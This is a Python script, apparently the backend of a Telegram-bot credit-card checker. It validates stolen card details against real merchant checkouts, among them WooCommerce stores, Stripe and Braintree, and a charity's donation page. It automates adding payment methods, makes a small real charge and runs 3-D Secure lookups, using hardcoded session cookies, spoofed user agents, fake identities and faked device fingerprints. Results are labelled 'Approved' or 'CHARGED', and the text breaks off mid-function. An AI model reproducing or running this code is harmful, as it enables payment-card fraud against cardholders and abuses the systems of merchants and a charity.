import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup

def bran(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	import requests,re,base64,user_agent
	user = user_agent.generate_user_agent()
	r = requests.session()
	
	cookies1 = { 'wordpress_logged_in_b960f265e2a7edd1b01197f060020468': 'my%20jdk.jjdjdj-3344%7C1752326562%7CY3t4KJJDpYL4VCLtLbbHdo0W9dQmiF46oEAl1lNmqai%7Cae8fac74b5bc6fe58209021f2e6f79203c3fec7416aa39c2dbc6bc479028f167',}
	
	cookies2 = { 'wordpress_logged_in_b960f265e2a7edd1b01197f060020468': 'my%20jdk.jjdjdj-3642%7C1752512847%7CEBUNBFoy8upRKxH5PK1JRsRrmeElac35EodfSMVu6oF%7Ca236b3c5f32b46a1d2f5070160066d89f1943925ebe3db8cbfcfbb7775a5643f',}

	cookies3 = { 'wordpress_logged_in_b960f265e2a7edd1b01197f060020468': 'my%20jdk.jjdjdj-5243%7C1752513344%7CElavHlfNBHRVcntYXiHDNPB7L3QyZM059Msrod4KvHz%7C5ec28a7490f0c8773dbea64febe02c87a95599a8f170a201f026004228c8bc27',}
	
	import random
	import time
	cookies_list = [cookies1, cookies2, cookies3]
	remaining_cookies = cookies_list.copy()
	if not remaining_cookies:
		remaining_cookies = cookies_list.copy()
	cookies = random.choice(remaining_cookies)
	remaining_cookies.remove(cookies)
	
	response = r.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/',headers={'user-agent': user,},cookies=cookies)
	
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
				
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text).group(1)
		
	au = base64.b64decode(r.post('https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php',headers={'user-agent': user,},data={'action':'wc_braintree_credit_card_get_client_token','nonce': client,},cookies=cookies).json()['data']).decode('utf-8').split('print":"')[1].split('"')[0]
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
	    'authorization': au,
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '60348010-3eea-4941-b833-9363e29936d8',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	tok = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()['data']['tokenizeCreditCard']['token']
	
	data = [
	    ('payment_method', 'braintree_credit_card'),
	    ('wc-braintree-credit-card-card-type', 'visa'),
	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
	    ('wc-braintree-credit-card-3d-secure-verified', ''),
	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
	    ('wc_braintree_credit_card_payment_nonce', tok),
	    ('wc_braintree_device_data', '{"correlation_id":"35d477c3ad85b89e7df9934ca96b9584"}'),
	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
	    ('wc_braintree_paypal_payment_nonce', ''),
	    ('wc_braintree_device_data', '{"correlation_id":"35d477c3ad85b89e7df9934ca96b9584"}'),
	    ('wc-braintree-paypal-context', 'shortcode'),
	    ('wc_braintree_paypal_amount', '0.00'),
	    ('wc_braintree_paypal_currency', 'USD'),
	    ('wc_braintree_paypal_locale', 'en_us'),
	    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
	    ('woocommerce-add-payment-method-nonce', nonce),
	    ('_wp_http_referer', '/my-account/add-payment-method/'),
	    ('woocommerce_add_payment_method', '1'),
	]
	
	response = r.post('https://www.midwestspeakerrepair.com/my-account/add-payment-method/',headers={'user-agent': user,},data=data,cookies=cookies)
	
	text = response.text
			
	pattern = r'Status code (.*?)\s*</li>'
			
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
		
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'does not support this type of purchase.' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
		
		return 'Approved !✅'
		
	elif 'risk_threshold' in result:
		
		return "RISK: Retry this BIN later."
		
	elif 'Duplicate card exists in the vault.' in result:
		
		return 'Approved ✅! - Duplicate'
		
	elif "Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "avs" in result:
		
		return 'Approved ✅! - AVS'
		
	elif "Invalid postal code" in result or "CVV." in result:
		
		return 'Approved ✅! - Invalid postal code and cvv'
		
	elif "Card Issuer Declined CVV" in result:
		return "Card Issuer Declined CVV"
		
	else:
		return str(result).strip()
		
##############################


def st(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]
	import requests,user_agent
	user = user_agent.generate_user_agent()
	r = requests.session()
	def random_string(length=8):
		return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
	username = random_string(15)
	email = f"{username}@gmail.com"
	
	reg = requests.get('https://wildeflowersdronfield.co.uk/my-account/add-payment-method/', headers= {'user-agent': user,}).text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]

	r.post('https://wildeflowersdronfield.co.uk/my-account/add-payment-method/',headers={'user-agent': user,},data={'email': email,'woocommerce-register-nonce': reg,'_wp_http_referer': '/my-account/add-payment-method/','register': 'Register',},)
	
	nonce = r.get('https://wildeflowersdronfield.co.uk/my-account/add-payment-method/', headers={'user-agent': user,}).text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IQ&payment_user_agent=stripe.js%2F7c7e495c02%3B+stripe-js-v3%2F7c7e495c02%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwildeflowersdronfield.co.uk&time_on_page=174410&client_attribution_metadata[client_session_id]=414e84ce-0ddc-4b8b-a2f9-c6ea88f879bf&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=34faaa29-2654-4f88-864c-5fb07b47dc9740fcfd&muid=03ce9bf8-dc59-441b-aa0e-389af1a02fdd894eac&sid=0ec687a3-f977-4a04-8902-6d3a8630f70ca5376a&key=pk_live_RMDmlFeaXRdWI0WRKp9cBkVW00tGyOBcmc&_stripe_version=2024-06-20'
	
	id = r.post('https://api.stripe.com/v1/payment_methods', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',}
	,data=data).json()['id']
	
	res = r.post('https://wildeflowersdronfield.co.uk/', params={'wc-ajax':'wc_stripe_create_and_confirm_setup_intent',}, headers= {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36','x-requested-with': 'XMLHttpRequest',}, data={'action': 'create_and_confirm_setup_intent','wc-stripe-payment-method': id,'wc-stripe-payment-type': 'card','_ajax_nonce': nonce,}).text
	
	if 'Your card was declined.' in res or 'Your card could not be set up for future usage.' in res:
		return 'Your card was declined.'
		
	elif 'success' in res or 'Success' in res:
		return 'Payment Method Successfully Added'
	elif 'Your card number is incorrect.' in res:
		return 'Your card number is incorrect.'
	else:
		try:
			return response.json()['data']['error']['message']
		except:

			return 'None'

##############################

###################

# Stripe Charge 3.50$

###################


def cha(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]
	import requests,user_agent
	user = user_agent.generate_user_agent()
	
	import requests
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	r = requests.session()
	
	data = MultipartEncoder({
	    'attribute_pa_scent': (None, 'refreshing'),
	    'quantity': (None, '1'),
	    'add-to-cart': (None, '49788'),
	    'product_id': (None, '49788'),
	    'variation_id': (None, '49797'),
	})
	
	r.post('https://my-styles.co.uk/product/wax-melt-sample-pack/', headers={'content-type': data.content_type,'user-agent': user,},data=data)
	
	nonce = r.get('https://my-styles.co.uk/shop-info/checkout/', headers={'user-agent': user,}).text.split('name="woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
	
	data = f'type=card&billing_details[name]=my+jdk+jjdjdj&billing_details[address][line1]=street&billing_details[address][city]=new+york&billing_details[address][postal_code]=BT10+1BE&billing_details[address][country]=GB&billing_details[email]=vjjdjeddnxnjdjxj%40gmail.com&billing_details[phone]=%2B2016459785&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=34faaa29-2654-4f88-864c-5fb07b47dc9740fcfd&muid=a1a30e41-128e-4f6a-b1cf-26fc8e898eb68cd3d3&sid=798a1afa-c7af-4698-942c-edda3dba763fad0cbf&payment_user_agent=stripe.js%2F7c7e495c02%3B+stripe-js-v3%2F7c7e495c02%3B+split-card-element&referrer=https%3A%2F%2Fmy-styles.co.uk&time_on_page=159130&key=pk_live_51HUuNIHUdJsByK2ANWz2WCYMAaXE0pHtl2AWC0SP2NCF1UL2XR1ITU7fXpAqpSNqbtltDXwlHIN2IwAR2JE0jzsz00paaATlRm'
	
	id = r.post('https://api.stripe.com/v1/payment_methods', headers={'user-agent': user,}, data=data).json()['id']
	
	data = {
	    'billing_first_name': 'my jdk',
	    'billing_last_name': 'jjdjdj',
	    'billing_company': 'alsl',
	    'billing_country': 'GB',
	    'billing_address_1': 'street',
	    'billing_address_2': '',
	    'billing_city': 'new york',
	    'billing_state': '',
	    'billing_postcode': 'BT10 1BE',
	    'billing_phone': '+2016459785',
	    'billing_email': 'vjjdjeddnxnjdjxj@gmail.com',
	    'shipping_first_name': 'my jdk',
	    'shipping_last_name': 'jjdjdj',
	    'shipping_company': 'alsl',
	    'shipping_country': 'GB',
	    'shipping_address_1': 'street',
	    'shipping_address_2': '',
	    'shipping_city': 'new york',
	    'shipping_state': '',
	    'shipping_postcode': 'BT10 1BE',
	    'shipping_phone': '+2016459785',
	    'order_comments': '',
	    'shipping_method[45737]': 'flexible_shipping_single:16',
	    'payment_method': 'stripe',
	    'cr_customer_consent': 'on',
	    'cr_customer_consent_field': '1',
	    'terms': 'on',
	    'terms-field': '1',
	    'woocommerce-process-checkout-nonce': nonce,
	    '_wp_http_referer': '/?wc-ajax=update_order_review',
	    'stripe_source': id,
	}
	
	res = r.post('https://my-styles.co.uk/', params={'wc-ajax': 'checkout',}, headers={'user-agent': user,}, data=data).text
	
	if 'Your card was declined.' in res or 'The card was declined.' in res:
		return 'Your card was declined.'
	elif 'success' in res or 'Success' in res or 'Successfully' in res:
		return 'CHARGED - 3.50$ ✅'
	elif 'Your card number is incorrect.' in res:
		return 'Your card number is incorrect.'
	elif 'Insufficient Funds' in res or 'funds' in res or 'Funds' in res:
		return 'Insufficient Funds'
	
	
##############################

################

# Braintree LookUp

################


def otp1(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]
	import user_agent
	user = user_agent.generate_user_agent()
	import requests
	import re
	import base64
	import jwt
	r = requests.session()
	import faker
	F = faker.Faker()
	name1 = F.name()
	name2 = F.name()
	
	name = ''.join(random.choices(string.ascii_lowercase, k=20))
	number = ''.join(random.choices(string.digits, k=4))
					
	acc = f"{name}{number}@gmail.com"
	try:
		
		headers = {
	    'user-agent': user,
		}
	
		response = r.get('https://securepay.breastcancernow.org/api/getSetup', headers=headers)
	
		cli = (response.json()['token'])
	
		dec = base64.b64decode(cli).decode('utf-8')
	
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	except:
		return 'Error In Gate'
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://securepay.breastcancernow.org',
	    'referer': 'https://securepay.breastcancernow.org/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': None,
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	
	headers = {
	    'authority': 'centinelapi.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://securepay.breastcancernow.org',
	    'referer': 'https://securepay.breastcancernow.org/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	    'x-cardinal-tid': 'Tid-5ce30f6c-0533-431b-906d-ad4763b9caff',
	}
	
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': '0_602ad320-55bd-4bee-b2b5-70b859be49d7',
	    'ServerJWT': cardnal,
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	
	payload = response.json()['CardinalJWT']
					
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
					
	reference_id = payload_dict['ReferenceId']
	
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=66f358eb70ff5e04cd08d351&tmEventType=PAYMENT&referenceId=0_602ad320-55bd-4bee-b2b5-70b859be49d7&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': 'dc5e40998d94ef3ff397443474ad68d0',
	    'FingerprintingTime': 1342,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'ar-IQ',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '66f358eb70ff5e04cd08d351',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': 'https://securepay.breastcancernow.org/',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2222222222222223,
	        'Resolution': '800x360',
	        'UsableResolution': '800x360',
	        'CCAScreenSize': '01',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -180,
	    'UserAgent': user,
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': '3bea089f-c733-411f-bbc2-eabc60a9668f',
	}
	
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    headers=headers,
	    json=json_data,
	)
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': None,
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://securepay.breastcancernow.org',
	    'referer': 'https://securepay.breastcancernow.org/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'amount': 10,
	    'additionalInfo': {
	        'billingLine1': 'D, Selborne Mansions',
	        'billingLine2': 'Selborne Mount',
	        'billingCity': 'Bradford',
	        'billingPostalCode': 'BD9 4NP',
	        'billingCountryCode': 'gb',
	        'billingGivenName': name1,
	        'billingSurname': name2,
	        'email': acc,
	    },
	    'bin': n[:6],
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.71.1',
	        'cardinalDeviceDataCollectionTimeElapsed': 386,
	        'issuerDeviceDataCollectionTimeElapsed': 7477,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.71.1',
	    '_meta': {
	        'merchantAppId': 'securepay.breastcancernow.org',
	        'platform': 'web',
	        'sdkVersion': '3.71.1',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': 'eb0a8d96-482a-4d8a-ac89-f694493b9d30',
	    },
	}
	
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/n47mkdj4n22qjcyq/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)

	msg2 = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]

	if 'challenge_required' in msg2:
		
		return 'challenge_required'
		
	elif 'authenticate_attempt_successful' in msg2:
		return 'authenticate_attempt_successful'
		
	elif 'authenticate_frictionless_failed' in msg2:
		return 'authenticate_frictionless_failed'		
	elif 'authenticate_successful' in msg2:		
		return 'authenticate_successful'		
	elif 'lookup_card_error' in msg2:
		return 'lookup_card_error'	
	elif 'lookup_error' in msg2:	
		return 'lookup_error'	
	else:
		return msg2

##############################

def otp2(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]
	import user_agent
	user = user_agent.generate_user_agent()
	import requests
	import re
	import base64
	import jwt
	r = requests.session()
	import faker
	F = faker.Faker()
	name1 = F.name()
	name2 = F.name()
	
	name = ''.join(random.choices(string.ascii_lowercase, k=20))
	number = ''.join(random.choices(string.digits, k=4))
					
	acc = f"{name}{number}@gmail.com"
	
	import requests
	import re
	import base64
	import jwt
	r = requests.session()
	
	try:
		headers = {
	    'user-agent': user,
	}
	
		response = r.get('https://www.madfun.co.uk/checkout/', headers=headers)
	
		cli = re.search(r'"clientToken":"(.*?)"',response.text).group(1)
		
		ba = base64.b64decode(cli).decode('utf-8')
		
		au = re.findall(r'"authorizationFingerprint":"(.*?)"',ba)[0]
	except:
		return 'Error In Gate'
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'user-agent': user,
	}
	
	json_data = {
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	
	headers = {
	    'content-type': 'application/json;charset=UTF-8',
	    'user-agent': user,
	    'x-cardinal-tid': 'Tid-a2b3bd03-ff50-4f6f-b1cf-c978e4620b48',
	}
	
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': '0_b276c872-51d6-4ed6-87c0-9ef63456bd8a',
	    'ServerJWT': cardnal,
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	
	payload = response.json()['CardinalJWT']
						
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
						
	reference_id = payload_dict['ReferenceId']
	
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5dbb76a8aafe772534d04a7a&tmEventType=PAYMENT&referenceId=0_8a19ebe6-c717-4edc-b7ce-1efde8199b42&geolocation=false&origin=Songbird',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': 'dc5e40998d94ef3ff397443474ad68d0',
	    'FingerprintingTime': 447,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'ar-IQ',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '5dbb76a8aafe772534d04a7a',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': 'https://www.madfun.co.uk/',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2222222222222223,
	        'Resolution': '800x360',
	        'UsableResolution': '800x360',
	        'CCAScreenSize': '01',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -180,
	    'UserAgent': user,
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': 'dac5169d-9133-4cd5-ba8a-638a181bb94e',
	}
	
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    headers=headers,
	    json=json_data,
	)
	
	headers = {
